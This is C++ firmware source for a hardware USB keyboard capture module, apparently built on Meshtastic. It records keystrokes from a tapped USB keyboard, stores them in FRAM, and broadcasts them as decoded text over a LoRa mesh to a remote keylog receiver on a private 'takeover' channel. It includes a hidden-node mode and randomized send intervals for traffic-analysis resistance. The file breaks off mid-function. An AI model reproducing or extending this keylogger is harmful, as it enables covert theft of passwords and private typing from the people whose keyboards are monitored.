/**
 * @file USBCaptureModule.cpp
 * @brief USB keyboard capture module implementation with LoRa mesh transmission
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * ============================================================================
 * MESH TRANSMISSION - Broadcast on Channel 1 "takeover" (v7.0)
 * ============================================================================
 *
 * When the keystroke buffer is finalized (full or flushed), it is automatically
 * broadcast on channel 1 "takeover" to all nodes with matching PSK.
 *
 * Channel Configuration:
 *   - Channel Index: 1 ("takeover" private channel)
 *   - Uses 32-byte PSK encryption (configured in userPrefs.jsonc)
 *   - Port: 490 (custom private port for KeylogReceiverModule)
 *
 * Transmission Details (Broadcast Mode):
 *   - Single packet per batch (no fragmentation) - v7.2
 *   - Buffer sized to fit: 180 bytes raw → ~230 bytes decoded < 233 byte limit
 *   - Broadcasts to NODENUM_BROADCAST (all nodes on channel)
 *   - No mesh-level ACK (want_ack=false for broadcast)
 *   - Application-level ACK from KeylogReceiverModule on Heltec V4
 *   - Target node auto-captured from first ACK response for tracking
 *
 * Function: sendToTargetNode(data, len)
 *   - Validates inputs and mesh service availability
 *   - Sends complete batch in single packet (no fragmentation)
 *   - Uses service->sendToMesh() with DEFAULT priority
 *
 * ============================================================================
 * KEYSTROKE BUFFER FORMAT (200 bytes) - Delta Encoding (v7.2)
 * ============================================================================
 *
 * Layout:
 * ┌─────────────┬────────────────────────────────────────┬─────────────┐
 * │ Bytes 0-9   │           Bytes 10-189                 │ Bytes 190-199│
 * │ Start Epoch │     Keystroke Data (180 bytes)         │ Final Epoch │
 * └─────────────┴────────────────────────────────────────┴─────────────┘
 *
 * Epoch Format (Start/End):
 *   - 10 ASCII digits representing unix timestamp (e.g., "1733250000")
 *   - Start epoch: Written when buffer is initialized (first keystroke)
 *   - Final epoch: Written when buffer is finalized (full or flushed)
 *
 * Data Area Format:
 *   - Regular characters: 1 byte each (stored as-is)
 *   - Tab key: '\t' (1 byte)
 *   - Backspace: '\b' (1 byte)
 *   - Enter key: 0xFF marker + 2-byte delta = 3 bytes total
 *
 * Delta Encoding:
 *   - Enter key stores seconds elapsed since buffer start epoch
 *   - 2-byte big-endian format (0-65535 seconds = ~18 hours max)
 *   - Prefixed with 0xFF marker byte for identification
 *   - Buffer auto-finalizes if delta exceeds 65000 seconds
 *
 * Example Buffer Content:
 *   [1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][more][1733250099]
 *    └─start──┘              └─delta +5s──┘              └─delta +10s──┘       └─final───┘
 *
 * To Decode Enter Timestamp:
 *   enter_epoch = start_epoch + delta
 *   Example: 1733250000 + 5 = 1733250005
 *
 * Space Savings:
 *   - Old: 10 bytes per Enter (full epoch)
 *   - New: 3 bytes per Enter (marker + delta)
 *   - Savings: 7 bytes per Enter key (70% reduction)
 *
 * ============================================================================
 */

#include "USBCaptureModule.h"

#ifdef XIAO_USB_CAPTURE_ENABLED

#include "../platform/rp2xx0/usb_capture/usb_capture_main.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"           /* Still needed for psram_keystroke_buffer_t struct */
#include "../platform/rp2xx0/usb_capture/keyboard_decoder_core1.h"  /* For keyboard_decoder_core1_inject_text() */
#include "MinimalBatchBuffer.h"     /* v7.0: Minimal 2-slot RAM fallback */
#include "configuration.h"
#include "pico/multicore.h"
#include "gps/RTC.h"  /* For getRTCQuality(), RtcName() - v4.0 RTC logging */
#include "NodeDB.h"  /* For owner global (node name and role) */
#include <Arduino.h>
#include <cstring>

/* Mesh includes for private channel transmission */
#include "MeshService.h"
#include "Router.h"
#include "mesh-pb-constants.h"

/* Port and channel constants defined in USBCaptureModule.h (v7.0) */

USBCaptureModule *usbCaptureModule;

#ifdef HAS_FRAM_STORAGE
FRAMBatchStorage *framStorage = nullptr;
#endif

/* Global queues for inter-core communication */
static keystroke_queue_t g_keystroke_queue;
static formatted_event_queue_t g_formatted_queue;

USBCaptureModule::USBCaptureModule()
    : SinglePortModule("USBCapture", static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM)),
      concurrency::OSThread("USBCapture")
{
    keystroke_queue = &g_keystroke_queue;
    formatted_queue = &g_formatted_queue;
    core1_started = false;
    capture_enabled = true;  // Enabled by default
    /* Client identification now uses owner.long_name and owner.role (no local storage) */
}

bool USBCaptureModule::init()
{
    LOG_INFO("Init: Starting (Core%u)...", get_core_num());

    /* Log node identity (from Meshtastic owner config) */
    const char *role_str = (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN) ? "HIDDEN" : "CLIENT";
    LOG_INFO("Init: Node=%s Role=%s", owner.long_name, role_str);

    /* Initialize keystroke queue */
    keystroke_queue_init(keystroke_queue);

    /* Initialize formatted event queue */
    formatted_queue_init(formatted_queue);

#ifdef HAS_FRAM_STORAGE
    /* Initialize FRAM storage for non-volatile keystroke batches */
    LOG_INFO("FRAM: Init SPI0 CS=GPIO%d", FRAM_CS_PIN);
    framStorage = new FRAMBatchStorage(FRAM_CS_PIN, &SPI, FRAM_SPI_FREQ);

    if (!framStorage->begin()) {
        LOG_ERROR("FRAM: Init failed - using RAM fallback");
        delete framStorage;
        framStorage = nullptr;
    } else {
        /* FRAM initialized successfully */
        uint8_t manufacturerID = 0;
        uint16_t productID = 0;
        framStorage->getDeviceID(&manufacturerID, &productID);
        LOG_INFO("FRAM: OK Mfr=0x%02X Prod=0x%04X", manufacturerID, productID);
        LOG_INFO("FRAM: %u batches, %lu bytes free",
                 framStorage->getBatchCount(), framStorage->getAvailableSpace());
    }
#endif

    /* Always initialize MinimalBatchBuffer (v7.0)
     * Required because command handlers (STATUS, STATS, DUMP) always query buffer state.
     * Also serves as RAM fallback when FRAM unavailable or fails. */
    minimal_buffer_init();

    /* Initialize capture controller */
    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);

    /* Set capture speed - default to LOW speed (1.5 Mbps) */
    /* Change to CAPTURE_SPEED_FULL for full speed USB (12 Mbps) */
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    /* Core1 will be launched on first runOnce() call */
    LOG_INFO("Init: Complete (Core1 pending)");

#ifdef USB_CAPTURE_SIMULATE_KEYS
    LOG_WARN("Sim: MODE ENABLED - %d batches every %d ms (no USB needed)",
             SIM_BATCH_COUNT, SIM_INTERVAL_MS);
#endif

    return true;
}

/**
 * @brief Check if Core1 is alive and healthy (REQ-OPS-001)
 *
 * Evaluates Core1 health based on multiple factors:
 * 1. Core1 must be started
 * 2. If USB connected but no captures for >60s → STALLED
 * 3. If USB disconnected → OK (expected behavior)
 * 4. If error count is high → ERROR
 *
 * Updates g_core1_health.status as a side effect.
 *
 * @return true if Core1 is healthy or expected behavior, false if stalled/error
 */
bool USBCaptureModule::isCore1Alive()
{
    uint32_t now = millis();

    /* Rate-limit health checks to once per second */
    if (now - lastHealthCheckTime < CORE1_HEALTH_UPDATE_INTERVAL_MS) {
        return g_core1_health.status == CORE1_STATUS_OK;
    }
    lastHealthCheckTime = now;

    /* Core1 not started yet - report as stopped */
    if (!core1_started) {
        g_core1_health.status = CORE1_STATUS_STOPPED;
        return false;
    }

    /* If capture is disabled, report as stopped */
    if (!capture_enabled) {
        g_core1_health.status = CORE1_STATUS_STOPPED;
        return false;
    }

    /* Read volatile health metrics with memory barrier */
    __dmb();
    uint32_t last_capture_ms = g_core1_health.last_capture_time_ms;
    uint32_t error_count = g_core1_health.error_count;
    uint8_t usb_connected = g_core1_health.usb_connected;
    __dmb();

    /* If USB not connected, Core1 is OK (no captures expected) */
    if (!usb_connected) {
        g_core1_health.status = CORE1_STATUS_OK;
        return true;
    }

    /* USB is connected - check for stall condition */
    uint32_t time_since_capture = now - last_capture_ms;

    /* If we've never captured (last_capture_ms == 0), check against core start time */
    if (last_capture_ms == 0) {
        /* No captures yet - this is OK during initial startup */
        if (now < CORE1_STALL_THRESHOLD_MS) {
            g_core1_health.status = CORE1_STATUS_OK;
            return true;
        }
        /* Been running a while with USB connected but no captures - stalled */
        g_core1_health.status = CORE1_STATUS_STALLED;
        return false;
    }

    /* Check if stalled (USB connected but no captures for >60s) */
    if (time_since_capture > CORE1_STALL_THRESHOLD_MS) {
        g_core1_health.status = CORE1_STATUS_STALLED;
        return false;
    }

    /* Check for high error rate (more errors than successful captures) */
    uint32_t capture_count = g_core1_health.capture_count;
    if (error_count > 0 && capture_count > 0 && error_count > capture_count) {
        g_core1_health.status = CORE1_STATUS_ERROR;
        return false;
    }

    /* All checks passed - Core1 is healthy */
    g_core1_health.status = CORE1_STATUS_OK;
    return true;
}

int32_t USBCaptureModule::runOnce()
{
    /* Launch Core1 on first run (completely non-blocking) */
    if (!core1_started)
    {
        LOG_INFO("Init: Launching Core1...");
        LOG_DEBUG("Init: queue=%p", (void*)keystroke_queue);

        /* Check if Core1 is already running (safety check) */
        if (multicore_fifo_rvalid())
        {
            LOG_WARN("Init: FIFO drain required");
            multicore_fifo_drain();
        }

        /* Try to reset Core1 first in case it's in a bad state */
        multicore_reset_core1();

        /* Use busy-wait instead of delay() to avoid scheduler issues */
        uint32_t start = millis();
        while (millis() - start < CORE1_LAUNCH_DELAY_MS)
        {
            tight_loop_contents();
        }

        /* Core1 will auto-start capture when launched - no commands needed */
        multicore_launch_core1(capture_controller_core1_main_v2);
        core1_started = true;

        LOG_INFO("Init: Core1 running");
    }

    /* REQ-OPS-001: Periodic Core1 health check (rate-limited internally) */
    isCore1Alive();

    /* v6.0: Check for ACK timeout before processing new batches
     * This handles retries with exponential backoff */
    checkPendingTimeout();

#ifdef USB_CAPTURE_SIMULATE_KEYS
    /* v6.1: Simulation mode - generate fake keystroke batches for testing
     * This bypasses Core1/PIO and writes directly to FRAM */
    if (sim_enabled && capture_enabled) {
        simulateKeystrokes();
    }
#endif

    /* Poll PSRAM/FRAM for completed buffers from Core1 */
    processPSRAMBuffers();

    /* Note: Formatted event logging now happens directly on Core1 */

    /* Poll every 20 seconds to reduce overhead */
    return RUNONCE_INTERVAL_MS;
}

/**
 * @brief Decode binary keystroke buffer into human-readable text
 *
 * Converts raw buffer data (with delta encoding) into plain text that
 * can be displayed on receiving devices' phone apps.
 *
 * @param buffer Source buffer with binary keystroke data
 * @param output Destination buffer for decoded text
 * @param max_len Maximum output buffer size
 * @return Length of decoded text
 */
size_t USBCaptureModule::decodeBufferToText(const psram_keystroke_buffer_t *buffer,
                                            char *output, size_t max_len)
{
    size_t out_pos = 0;

    /* Add node name prefix UNLESS role is CLIENT_HIDDEN */
    if (owner.role != meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN &&
        owner.long_name[0] != '\0') {
        out_pos += snprintf(output + out_pos, max_len - out_pos,
                           "[%s] ", owner.long_name);
    }

    /* Add header with timestamp */
    out_pos += snprintf(output + out_pos, max_len - out_pos,
                       "[%u→%u] ", buffer->start_epoch, buffer->final_epoch);

    /* Decode keystroke data */
    for (size_t i = 0; i < buffer->data_length && out_pos < max_len - 1; i++)
    {
        unsigned char c = (unsigned char)buffer->data[i];

        /* Check for delta marker (Enter key with timestamp) */
        if (c == 0xFF && (i + 2) < buffer->data_length)
        {
            /* Read 2-byte delta */
            uint16_t delta = ((unsigned char)buffer->data[i + 1] << 8) |
                             (unsigned char)buffer->data[i + 2];

            /* Add newline for Enter key */
            if (out_pos < max_len - 1) {
                output[out_pos++] = '\n';
            }

            i += 2; /* Skip delta bytes */
            continue;
        }

        /* Copy regular characters */
        if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX) {
            output[out_pos++] = c;
        } else if (c == '\t' && out_pos < max_len - 1) {
            output[out_pos++] = '\t';
        } else if (c == '\b' && out_pos < max_len - 1) {
            output[out_pos++] = '\b';
        }
    }

    output[out_pos] = '\0';
    return out_pos;
}

/**
 * @brief Process PSRAM buffers and transmit them (Core0 operation)
 *
 * Core0's primary responsibility for keystroke transmission. Polls the PSRAM
 * ring buffer for complete keystroke buffers written by Core1 and transmits them.
 *
 * Processing Flow:
 *  1. Check if storage has data (FRAM or MinimalBatchBuffer)
 *  2. Read complete buffer (already formatted by Core1)
 *  3. Decode binary buffer to human-readable text
 *  4. Log buffer content with decoded timestamps
 *  5. Transmit decoded text (rate-limited to prevent mesh flooding)
 *  6. Repeat while buffers available
 *  7. Log statistics every 10 seconds
 *
 * Performance:
 *  - Ultra-lightweight: Just memcpy + decode + transmit
 *  - No formatting overhead (done by Core1)
 *  - No buffer management (done by Core1)
 *  - Estimated CPU: ~0.2% (vs 2% before)
 *
 * @note Called every 100ms from runOnce()
 * @note Rate-limited to 1 transmission per 6 seconds to prevent mesh flooding
 * @note Statistics: available, total_transmitted, dropped_buffers
 */
void USBCaptureModule::processPSRAMBuffers()
{
    psram_keystroke_buffer_t buffer;
    static uint32_t last_transmit_time = 0;
    static uint32_t next_tx_interval = TX_INTERVAL_MIN_MS;  /* v7.6: Randomized interval */
    bool have_data = false;

    /* Skip processing if capture is disabled */
    if (!capture_enabled) {
        return;
    }

    /* NASA Rule 5: Check pending state before processing
     * Skip if we're waiting for ACK on a previous batch */
    if (pendingTx.batch_id != 0) {
        LOG_DEBUG("[USBCapture] Waiting for ACK on batch 0x%08x (elapsed %u ms)",
                  pendingTx.batch_id, millis() - pendingTx.send_time);
        return;
    }

#ifdef HAS_FRAM_STORAGE
    /* Try to read from FRAM storage if available */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
        uint16_t actualLength = 0;

        if (framStorage->readBatch(fram_batch, sizeof(fram_batch), &actualLength)) {
            /* Unpack FRAM batch format into psram_keystroke_buffer_t
             * FRAM format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N]
             * Total header: 12 bytes + data */
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &fram_batch[0], 4);
                memcpy(&buffer.final_epoch, &fram_batch[4], 4);
                memcpy(&buffer.data_length, &fram_batch[8], 2);
                memcpy(&buffer.flags, &fram_batch[10], 2);

                /* Copy keystroke data */
                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* Truncate if too large */
                }
                memcpy(buffer.data, &fram_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
            /* Note: We'll delete the batch after successful transmission */
        }
    } else {
        /* Fall back to MinimalBatchBuffer (v7.0) - 2-slot RAM buffer */
        uint8_t minimal_batch[MINIMAL_BUFFER_DATA_SIZE];
        uint16_t actualLength = 0;
        uint32_t batchId = 0;

        if (minimal_buffer_read(minimal_batch, sizeof(minimal_batch), &actualLength, &batchId)) {
            /* Unpack batch format into psram_keystroke_buffer_t for compatibility
             * Batch format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N] */
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &minimal_batch[0], 4);
                memcpy(&buffer.final_epoch, &minimal_batch[4], 4);
                memcpy(&buffer.data_length, &minimal_batch[8], 2);
                memcpy(&buffer.flags, &minimal_batch[10], 2);

                /* Copy keystroke data */
                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* Truncate if too large */
                }
                memcpy(buffer.data, &minimal_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
        }
    }
#else
    /* No FRAM - use MinimalBatchBuffer (v7.0) - 2-slot RAM buffer */
    uint8_t minimal_batch[MINIMAL_BUFFER_DATA_SIZE];
    uint16_t actualLength = 0;
    uint32_t batchId = 0;

    if (minimal_buffer_read(minimal_batch, sizeof(minimal_batch), &actualLength, &batchId)) {
        /* Unpack batch format into psram_keystroke_buffer_t for compatibility
         * Batch format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N] */
        if (actualLength >= 12) {
            memcpy(&buffer.start_epoch, &minimal_batch[0], 4);
            memcpy(&buffer.final_epoch, &minimal_batch[4], 4);
            memcpy(&buffer.data_length, &minimal_batch[8], 2);
            memcpy(&buffer.flags, &minimal_batch[10], 2);

            /* Copy keystroke data */
            uint16_t data_len = actualLength - 12;
            if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                data_len = PSRAM_BUFFER_DATA_SIZE;  /* Truncate if too large */
            }
            memcpy(buffer.data, &minimal_batch[12], data_len);
            buffer.data_length = data_len;

            have_data = true;
        }
    }
#endif

    /* Process only ONE buffer per call to avoid flooding */
    if (have_data)
    {
        /* Get RTC quality for logging (v4.0) */
        RTCQuality rtc_quality = getRTCQuality();
        const char *time_source = RtcName(rtc_quality);

        /* Single INFO line for transmission summary */
        LOG_INFO("Tx: Buffer %u bytes (epoch %u→%u)",
                buffer.data_length, buffer.start_epoch, buffer.final_epoch);

        /* Buffer content details at DEBUG level only */
        LOG_DEBUG("=== BUFFER START ===");
        LOG_DEBUG("Time source: %s (quality=%d)", time_source, rtc_quality);
        if (rtc_quality >= RTCQualityFromNet) {
            LOG_DEBUG("Start Time: %u (unix epoch from %s)", buffer.start_epoch, time_source);
        } else {
#ifdef BUILD_EPOCH
            LOG_DEBUG("Start Time: %u (BUILD_EPOCH + uptime: %u + %u)",
                    buffer.start_epoch, (uint32_t)BUILD_EPOCH,
                    buffer.start_epoch - (uint32_t)BUILD_EPOCH);
#else
            LOG_DEBUG("Start Time: %u seconds (uptime since boot)", buffer.start_epoch);
#endif
        }

        /* Log data in chunks to avoid line length issues */
        char line_buffer[MAX_LINE_BUFFER_SIZE];
        size_t line_pos = 0;

        for (size_t i = 0; i < buffer.data_length; i++)
        {
            unsigned char c = (unsigned char)buffer.data[i];

            /* Check for delta marker (0xFF followed by 2 bytes) */
            if (c == 0xFF && (i + 2) < buffer.data_length)
            {
                /* Output current line if we have content */
                if (line_pos > 0)
                {
                    line_buffer[line_pos] = '\0';
                    LOG_DEBUG("Line: %s", line_buffer);
                    line_pos = 0;
                }

                /* Read 2-byte delta (big-endian) */
                uint16_t delta = ((unsigned char)buffer.data[i + 1] << 8) |
                                 (unsigned char)buffer.data[i + 2];

                /* Calculate full timestamp from start + delta */
                uint32_t enter_time = buffer.start_epoch + delta;

                LOG_DEBUG("Enter [time=%u seconds, delta=+%u]", enter_time, delta);
                i += 2; /* Skip delta bytes */
                continue;
            }

            /* Add character to current line */
            if (c == '\t')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 't';
                }
            }
            else if (c == '\b')
            {
                if (line_pos < sizeof(line_buffer) - 3)
                {
                    line_buffer[line_pos++] = '\\';
                    line_buffer[line_pos++] = 'b';
                }
            }
            else if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX)
            {
                if (line_pos < sizeof(line_buffer) - 1)
                {
                    line_buffer[line_pos++] = c;
                }
            }
        }

        /* Output any remaining content */
        if (line_pos > 0)
        {
            line_buffer[line_pos] = '\0';
            LOG_DEBUG("Line: %s", line_buffer);
        }

        LOG_DEBUG("Final Time: %u seconds (uptime since boot)", buffer.final_epoch);
        LOG_DEBUG("=== BUFFER END ===");

        /* Decode buffer to human-readable text */
        /* TODO: Future FRAM implementation - transmit binary encrypted data instead of decoded text
         *       Once FRAM storage is implemented, we should:
         *       1. Keep binary buffer format for efficient storage
         *       2. Encrypt binary data before transmission
         *       3. Receiving nodes decrypt and decode on their end
         *       For now, decode to text so phone apps can display it */
        char decoded_text[MAX_DECODED_TEXT_SIZE];
        size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));

        LOG_INFO("Tx: Decoded %zu bytes", text_len);

        /* Rate limiting: Randomized interval (40s-4min) for traffic analysis resistance
         * v7.6: Interval is randomized after each successful transmission
         * Note: With ACK tracking, we only send one batch at a time anyway */
        uint32_t now = millis();
        if (now - last_transmit_time >= next_tx_interval)
        {
            /* Generate batch ID for ACK correlation (v7.5)
             * RTC-based unique ID prevents dedup collision after reboot/FRAM clear
             * Upper 16 bits: RTC seconds (unique across reboots)
             * Lower 16 bits: Random (unique within same second + across devices)
             * Uses same RTC quality check as core1_get_current_epoch() */
            uint32_t rtc_seconds = getValidTime(RTCQualityFromNet, false);
            if (rtc_seconds == 0) {
                /* Fallback: BUILD_EPOCH + uptime (same as Core1 pattern) */
                rtc_seconds = BUILD_EPOCH + (millis() / 1000);
            }
            uint32_t batchId = (rtc_seconds << 16) | (random(0xFFFF));

            /* Attempt transmission with batch header */
            uint32_t packetId = sendToTargetNode((const uint8_t *)decoded_text, text_len, batchId);

            if (packetId != 0)
            {
                /* Transmission queued - set up pending state for ACK tracking
                 * NASA Rule 5: Assertions for postconditions */
                assert(pendingTx.batch_id == 0);  /* Should be clear at this point */

                pendingTx.batch_id = batchId;
                pendingTx.packet_id = packetId;
                pendingTx.send_time = now;
                pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
                pendingTx.retry_count = 0;

                last_transmit_time = now;

                /* v7.6: Generate new random interval for next transmission (40s-4min) */
                next_tx_interval = random(TX_INTERVAL_MIN_MS, TX_INTERVAL_MAX_MS + 1);

                LOG_INFO("Tx: Batch 0x%08x queued (timeout %ums, next_tx in %us)",
                         batchId, pendingTx.timeout_ms, next_tx_interval / 1000);

                /* NOTE: Batch is NOT deleted from FRAM here!
                 * v6.2: Deletion happens ONLY when ACK is received (handleAckResponse)
                 * Failed batches stay in FRAM forever and retry on next cycle */
            }
            else
            {
                /* Transmission failed immediately (no target, service unavailable, etc.)
                 * Track in statistics but don't set pending state
                 * v6.2: Batch stays in FRAM - will retry on next runOnce() cycle */
                __dmb();
                g_psram_buffer.header.transmission_failures++;
                __dmb();
                LOG_WARN("Tx: Failed 0x%08x - retry next cycle", batchId);
            }
        }
        /* else: Rate limit active - batch stays in FRAM, will retry next cycle */
    }

    /* Log statistics periodically */
    static uint32_t last_stats_time = 0;
    uint32_t stats_now = millis();
    if (stats_now - last_stats_time > STATS_LOG_INTERVAL_MS)
    {
        /* Declare statistics variables outside ifdef for use in warnings */
        uint32_t tx_failures = 0;
        uint32_t overflows = 0;
        uint32_t psram_failures = 0;

        uint32_t uptime = (uint32_t)(millis() / 1000);

#ifdef HAS_FRAM_STORAGE
        /* Use FRAM statistics if available */
        if (framStorage != nullptr && framStorage->isInitialized()) {
            uint8_t available = framStorage->getBatchCount();
            uint32_t free_space = framStorage->getAvailableSpace();
            uint8_t usage_pct = framStorage->getUsagePercentage();

            /* Get failure stats from RAM buffer header even when using FRAM */
            __dmb();
            tx_failures = g_psram_buffer.header.transmission_failures;
            overflows = g_psram_buffer.header.buffer_overflows;
            psram_failures = g_psram_buffer.header.psram_write_failures;
            __dmb();

            /* Single consolidated stats line */
            LOG_INFO("Stats: FRAM %u batches %luKB free (%u%% used) | uptime %us",
                    available, free_space / 1024, usage_pct, uptime);

            /* REQ-OPS-002: FRAM Capacity Alerting */
            if (usage_pct >= FRAM_CAPACITY_FULL_PCT) {
                LOG_ERROR("FRAM: STORAGE FULL (%u%%) - Batches being evicted!", usage_pct);
            } else if (usage_pct >= FRAM_CAPACITY_CRITICAL_PCT) {
                LOG_WARN("FRAM: Critical capacity (%u%%) - Increase TX rate or reduce input", usage_pct);
            } else if (usage_pct >= FRAM_CAPACITY_WARNING_PCT) {
                LOG_INFO("FRAM: High capacity (%u%%) - Monitor closely", usage_pct);
            }
        } else
#endif
        {
            /* Read MinimalBatchBuffer statistics (v7.0) */
            uint8_t available = minimal_buffer_count();

            /* Get failure stats from legacy header (still used for tracking) */
            __dmb();
            tx_failures = g_psram_buffer.header.transmission_failures;
            overflows = g_psram_buffer.header.buffer_overflows;
            psram_failures = g_psram_buffer.header.psram_write_failures;
            __dmb();

            /* Single consolidated stats line */
            LOG_INFO("Stats: Buf %u/%u | uptime %us",
                    available, MINIMAL_BUFFER_SLOTS, uptime);
        }

        /* Log warnings for critical failures */
        if (tx_failures > 0)
        {
            LOG_WARN("Stats: %u tx failures - check mesh connectivity", tx_failures);
        }
        if (overflows > 0)
        {
            LOG_WARN("Stats: %u buffer overflows (emergency finalized)", overflows);
        }
        if (psram_failures > 0)
        {
            LOG_ERROR("Stats: %u write failures - Core0 too slow", psram_failures);
        }

        last_stats_time = stats_now;
    }
}

/* processFormattedEvents() removed - Core1 now logs directly instead of queuing events */

/* formatKeystrokeEvent() removed - formatting now done on Core1 */

/* ============================================================================
 * BUFFER MANAGEMENT FUNCTIONS REMOVED
 * ============================================================================
 * All buffer management functions (writeEpochAt, writeDeltaAt, initKeystrokeBuffer,
 * getBufferSpace, addToBuffer, addEnterToBuffer, finalizeBuffer) have been moved
 * to Core1 (keyboard_decoder_core1.cpp).
 *
 * Core0 now only reads complete buffers from PSRAM and transmits them.
 * This reduces Core0 overhead by ~90% (2% → 0.2%).
 */

/**
 * @brief Send buffer data with batch header to target node
 *
 * Protocol format: [batch_id:4][start_epoch:4][final_epoch:4][data:N]
 * Uses custom port 490 for keystroke data (not visible in standard chat).
 *
 * NASA Power of 10 compliance:
 * - Fixed buffer size (no dynamic allocation)
 * - All pointer dereferences checked
 * - Loop has fixed upper bound (MAX_FRAGMENTS)
 * - Return value always meaningful
 *
 * @param data Pointer to keystroke data (decoded text)
 * @param len Length of data
 * @param batchId Unique batch ID for ACK correlation
 * @return Packet ID if successful, 0 if failed
 */
uint32_t USBCaptureModule::sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId)
{
    /* NASA Rule 5: Assertions for preconditions */
    assert(len <= MAX_DECODED_TEXT_SIZE);

    /* Validate inputs */
    if (!data || len == 0) {
        LOG_WARN("[USBCapture] sendToTargetNode: invalid data or length");
        return 0;
    }

    /* v7.0: Broadcast mode - no target node required
     * Target node is only used for ACK tracking after first response */

    /* Check if mesh service is available */
    if (!service) {
        LOG_WARN("[USBCapture] sendToTargetNode: service is NULL - mesh not ready");
        return 0;
    }
    if (!router) {
        LOG_WARN("[USBCapture] sendToTargetNode: router is NULL - mesh not ready");
        return 0;
    }
    LOG_DEBUG("[USBCapture] Mesh ready: service=%p, router=%p", (void*)service, (void*)router);

    /* Build packet with protocol version and batch header (REQ-PROTO-001)
     * Format: [magic:2][version:2][batch_id:4][data:N]
     * Magic marker enables backwards-compatible detection of old vs new format.
     * Note: start/final epochs are already in the decoded text prefix */
    const size_t MAGIC_SIZE = 2;     /* Magic bytes "UK" (0x55 0x4B) */
    const size_t VERSION_SIZE = 2;   /* Major + Minor version bytes */
    const size_t BATCH_ID_SIZE = 4;  /* batch_id (little-endian) */
    const size_t HEADER_SIZE = MAGIC_SIZE + VERSION_SIZE + BATCH_ID_SIZE;  /* Total: 8 bytes */
    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;

    /* NASA Rule 3: Fixed size buffer, no dynamic allocation */
    uint8_t packet_buffer[MAX_PAYLOAD];

    /* REQ-PROTO-001: Pack magic marker for format detection */
    packet_buffer[0] = USB_CAPTURE_PROTOCOL_MAGIC_0;  /* 0x55 'U' */
    packet_buffer[1] = USB_CAPTURE_PROTOCOL_MAGIC_1;  /* 0x4B 'K' */

    /* REQ-PROTO-001: Pack protocol version after magic */
    packet_buffer[2] = USB_CAPTURE_PROTOCOL_VERSION_MAJOR;
    packet_buffer[3] = USB_CAPTURE_PROTOCOL_VERSION_MINOR;

    /* Pack batch ID (little-endian for ARM) at offset 4 */
    memcpy(&packet_buffer[4], &batchId, 4);

    /* Calculate data that fits in first packet */
    size_t data_in_first = (len > MAX_PAYLOAD - HEADER_SIZE) ?
                           (MAX_PAYLOAD - HEADER_SIZE) : len;

    /* Copy keystroke data after header */
    memcpy(&packet_buffer[HEADER_SIZE], data, data_in_first);

    /* Allocate packet from router pool */
    meshtastic_MeshPacket *p = router->allocForSending();
    if (!p) {
        LOG_ERROR("[USBCapture] sendToTargetNode: failed to allocate packet");
        return 0;
    }

    /* Capture packet ID for ACK tracking (before send modifies it) */
    uint32_t sentPacketId = p->id;

    /* Configure packet for mesh broadcast on channel 1 "takeover" (v7.0)
     * - Broadcast to all nodes with matching channel PSK
     * - No mesh-level ACK (want_ack=false for broadcast)
     * - Application-level ACK via KeylogReceiverModule response */
    p->to = NODENUM_BROADCAST;
    p->channel = USB_CAPTURE_CHANNEL_INDEX;
    p->want_ack = false;  /* Broadcasts don't get mesh ACK - use app-level ACK */
    p->pki_encrypted = false;  /* Use channel PSK, not PKI */
    p->priority = meshtastic_MeshPacket_Priority_DEFAULT;

    /* Use custom port 490 - KeylogReceiverModule on Heltec listens here */
    p->decoded.portnum = static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM);

    /* Copy payload (header + data) */
    p->decoded.payload.size = HEADER_SIZE + data_in_first;
    memcpy(p->decoded.payload.bytes, packet_buffer, p->decoded.payload.size);

    /* Send to mesh */
    service->sendToMesh(p, RX_SRC_LOCAL, false);

    LOG_INFO("[USBCapture] Broadcast batch 0x%08x (%zu bytes) on ch%d, packet_id=0x%08x",
             batchId, HEADER_SIZE + data_in_first, USB_CAPTURE_CHANNEL_INDEX, sentPacketId);

    /* v7.2: Batches are sized to fit single packet - no fragmentation needed
     * NASA Rule 4: Assert that data fits (should always be true with new buffer sizes) */
    assert(len <= data_in_first && "Batch exceeds single packet - check buffer sizes");

    return sentPacketId;
}

// ============================================================================
// ACK TRACKING IMPLEMENTATION (v6.0)
// ============================================================================

/**
 * @brief Check for ACK timeout and handle retry/failure
 *
 * Called from runOnce() before processing new batches.
 * Implements exponential backoff: 30s -> 60s -> 120s (capped at ACK_MAX_TIMEOUT_MS).
 *
 * NASA Power of 10 compliance:
 * - Fixed loop bound (max ACK_MAX_RETRIES iterations over time)
 * - No dynamic memory allocation
 * - All return paths explicit
 */
void USBCaptureModule::checkPendingTimeout()
{
    /* No pending transmission - nothing to check */
    if (pendingTx.batch_id == 0) {
        return;
    }

